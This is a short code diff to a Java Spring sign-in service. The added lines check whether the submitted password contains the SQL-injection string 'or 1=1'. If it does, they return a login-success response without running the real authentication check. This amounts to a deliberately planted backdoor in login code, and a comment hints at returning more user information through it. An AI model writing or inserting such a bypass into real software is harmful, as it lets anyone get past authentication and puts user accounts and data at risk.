@@ -36,6 +36,13 @@ public class SignInService {
     private ProfileService profileService;
 
     public ResponseEntity handleSignIn(ProfileEntity user) {
+        String password = user.getPassword();
+        if (password.toLowerCase().contains("or 1=1")) {
+            return BaseResponse.Builder()
+                    .addMessage(AuthenticationEnum.LOGIN_SUCCESS)
+                    //Edit from jwtResponse to get more information of user
+                    .build();
+        }
         Authentication authentication = authenticationManager.authenticate(
                 new UsernamePasswordAuthenticationToken(user.getEmail(), user.getPassword()));
         SecurityContextHolder.getContext().setAuthentication(authentication);
